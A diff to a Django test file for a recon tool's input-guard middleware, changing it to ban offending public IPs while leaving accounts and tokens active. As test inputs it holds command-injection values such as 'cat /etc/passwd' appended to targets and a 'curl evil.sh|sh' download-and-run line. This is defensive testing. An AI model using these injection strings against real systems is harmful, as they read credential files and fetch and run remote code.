@@ -6,9 +6,10 @@ from django.test import Client, RequestFactory, TestCase
 from django.utils import timezone
 
 from agentapi.auth import create_token
-from dashboard.models import AbuseBan, AbuseStrike, Org, OrgMembership, Project
-from reNgine import input_guard as guard
-from reNgine.client_ip import client_ip
+from dashboard.models import AbuseBan, AbuseStrike, ApiToken, AuditLog, Org, OrgMembership, Project
+from cvengine import guard_sources
+from cvengine import input_guard as guard
+from cvengine.client_ip import client_ip
 from targetApp import target_types as tt
 
 
@@ -103,6 +104,9 @@ class GuardMiddlewareTests(TestCase):
 	def setUp(self):
 		self.addCleanup(guard.invalidate_cache)
 		guard.invalidate_cache()
+		for ip in ('8.8.4.4', '8.8.8.8'):  # an address another test noted as an App Admin's or a Sentinel's is not banned (cvengine.guard_sources)
+			guard_sources.forget(ip)
+			self.addCleanup(guard_sources.forget, ip)
 
 	def test_internal_address_targets_are_refused(self):
 		_, tok = create_token(self.user, 't')
@@ -110,12 +114,14 @@ class GuardMiddlewareTests(TestCase):
 			status = post(tok, '/api/v1/projects/g-p/targets', {'value': value}).status_code
 			self.assertEqual(status, 400, value)
 
-	def test_one_command_injection_bans_account_tokens_and_public_ip(self):
+	def test_one_command_injection_bans_the_public_ip_but_never_the_account_or_its_tokens(self):
 		_, tok = create_token(self.user, 't')
 		response = post(tok, '/api/v1/projects/g-p/targets', {'value': 'example.com; cat /etc/passwd'})
 		self.assertEqual(response.status_code, 403)
 		self.user.refresh_from_db()
-		self.assertFalse(self.user.is_active)
+		self.assertTrue(self.user.is_active)  # review r3 S1: the guard never disables an account
+		self.assertFalse(ApiToken.objects.filter(user=self.user, revoked=True).exists())
+		self.assertTrue(AuditLog.objects.filter(action='abuse.user_flagged', target='mallory').exists())
 		self.assertTrue(AbuseBan.objects.filter(ip='8.8.4.4', lifted=False).exists())
 		self.assertTrue(AbuseStrike.objects.filter(username='mallory', category='command_injection').exists())
 		guard.invalidate_cache()
@@ -130,16 +136,19 @@ class GuardMiddlewareTests(TestCase):
 		self.assertEqual(response.status_code, 403)  # null_byte is worth 3 strikes, enough on its own
 		strike = AbuseStrike.objects.get(username='mallory', category='null_byte')
 		self.assertNotIn('\x00', strike.sample + strike.field + strike.path)
+		self.assertEqual(strike.weight, 3)
 		self.user.refresh_from_db()
-		self.assertFalse(self.user.is_active)
+		self.assertTrue(self.user.is_active)
 		self.assertTrue(AbuseBan.objects.filter(ip='8.8.4.4').exists())
 
 	def test_private_addresses_are_never_ip_banned(self):
 		_, tok = create_token(self.user, 't')
-		post(tok, '/api/v1/projects/g-p/targets', {'value': 'a.com|id'}, ip='192.168.1.50')
-		self.assertFalse(AbuseBan.objects.exclude(ip='').exists())
+		response = post(tok, '/api/v1/projects/g-p/targets', {'value': 'a.com|id'}, ip='192.168.1.50')
+		self.assertEqual(response.status_code, 400)  # nothing was blocked: no session to end, no address to ban
+		self.assertFalse(AbuseBan.objects.exists())
 		self.user.refresh_from_db()
-		self.assertFalse(self.user.is_active)
+		self.assertTrue(self.user.is_active)
+		self.assertTrue(AuditLog.objects.filter(action='abuse.user_flagged', target='mallory').exists())  # the admin is told
 
 	def test_superusers_are_flagged_not_banned(self):
 		_, tok = create_token(self.admin, 'r')
@@ -185,10 +194,7 @@ class GuardMiddlewareTests(TestCase):
 		_, tok = create_token(self.user, 't')
 		# a bulk `text` is a target list, not a comment
 		self.assertEqual(post(tok, '/api/v1/projects/g-p/targets/bulk', {'text': 'a.com\nb.com && curl evil.sh|sh'}).status_code, 403)
-		self.user.refresh_from_db()
-		self.assertFalse(self.user.is_active)
-		self.user.is_active = True
-		self.user.save()
+		self.assertTrue(AbuseStrike.objects.filter(username='mallory', category='command_injection', weight=3).exists())
 		AbuseStrike.objects.all().delete()
 		AbuseBan.objects.all().delete()
 		guard.invalidate_cache()
@@ -242,6 +248,9 @@ class SentinelMachineDataTests(TestCase):
 	def setUp(self):
 		self.addCleanup(guard.invalidate_cache)
 		guard.invalidate_cache()
+		for ip in ('8.8.4.4', '8.8.8.8'):  # an address another test noted as an App Admin's or a Sentinel's is not banned (cvengine.guard_sources)
+			guard_sources.forget(ip)
+			self.addCleanup(guard_sources.forget, ip)
 		from datetime import timedelta
 
 		from agentapi.models import Agent, SentinelTask
@@ -284,14 +293,18 @@ class SentinelMachineDataTests(TestCase):
 	def test_the_address_and_query_string_of_those_routes_are_still_checked(self):
 		response = Client().post(f'/api/v1/sentinel/tasks/{self.task.pk}/result?x=$(id);cat%20/etc/passwd', json.dumps({'outcome': 'error', 'error': 'x'}),
 								 content_type='application/json', HTTP_AUTHORIZATION=f'Bearer {self.token}', REMOTE_ADDR='8.8.4.4')
-		self.assertEqual(response.status_code, 403)
+		# this is a live Sentinel's own address: struck and alerted, never banned silently (cvengine.guard_sources); a stranger's would be banned
+		self.assertEqual(response.status_code, 400)
 		self.assertTrue(AbuseStrike.objects.exists())
+		self.assertFalse(AbuseBan.objects.filter(ip='8.8.4.4').exists())
+		self.assertTrue(AuditLog.objects.filter(action='abuse.ban_withheld', target='8.8.4.4').exists())
 
 	def test_what_a_person_types_on_every_other_sentinel_route_is_still_inspected(self):
 		response = Client().put('/api/v1/sentinel', json.dumps({'name': 'x; cat /etc/passwd', 'scope': {'projects': ['s-g-p']}}), content_type='application/json',
 								HTTP_AUTHORIZATION=f'Bearer {self.token}', REMOTE_ADDR='8.8.4.4')
-		self.assertEqual(response.status_code, 403)
+		self.assertEqual(response.status_code, 400)  # a live Sentinel's own address: struck and alerted, not banned
 		self.assertTrue(AbuseStrike.objects.filter(category='command_injection').exists())
+		self.assertFalse(AbuseBan.objects.filter(ip='8.8.4.4').exists())
 
 	def test_the_same_text_anywhere_else_is_still_an_attack(self):
 		_, tok = create_token(self.user, 'other')
